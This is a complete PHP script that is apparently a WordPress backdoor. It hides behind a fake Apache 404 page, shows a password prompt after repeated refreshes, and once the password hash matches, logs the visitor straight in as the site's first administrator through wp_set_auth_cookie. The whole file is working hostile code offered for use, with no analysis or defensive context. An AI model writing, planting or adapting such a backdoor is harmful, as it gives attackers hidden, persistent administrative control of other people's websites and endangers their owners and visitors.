<?php
/* 3d0ed2ff9ee5cbfc9922cbe0a4259e84 */
session_start();
error_reporting(0);
ini_set('display_errors', 0);
$auth_md5='26f3a480cdb84acae7687918142404d9';
if(isset($_POST['p'])&&md5($_POST['p'])===$auth_md5){$_SESSION['auth']=true;}
if(!isset($_SESSION['refresh_count'])){$_SESSION['refresh_count']=1;}else{$_SESSION['refresh_count']++;}
if(!isset($_SESSION['auth'])){
    if($_SESSION['refresh_count']<6){
        echo'<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="robots" content="noindex, nofollow"><meta name="google" content="notranslate"><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr><address>Apache Server at '.htmlspecialchars($_SERVER['HTTP_HOST']??'localhost').' Port 80</address></body></html>';
        die();
    }else{
        echo'<html><head><meta name="robots" content="noindex, nofollow"><meta name="google" content="notranslate"></head><body style="background:#0c0c0c;display:grid;height:100vh;margin:0;place-items:center center;"><form action="" method="POST"><input style="text-align:center;background:#1a1a2e;color:#00ff88;border:2px solid #00ff88;padding:15px;font-size:18px;border-radius:8px;outline:none;" name="p" type="password" placeholder="Password"></form></body></html>';
        die();
    }
}
@set_time_limit(0);
$mr=$_SERVER['DOCUMENT_ROOT']??'';
@chdir($mr);
if(file_exists('wp-load.php')){
    include 'wp-load.php';
    $wp_user_query=new WP_User_Query(array('role'=>'Administrator','number'=>1,'fields'=>'ID'));
    $results=$wp_user_query->get_results();
    if(isset($results[0])){wp_set_auth_cookie($results[0]);wp_redirect(admin_url());die();}
    die('NO ADMIN');
}else{die('Failed to load');}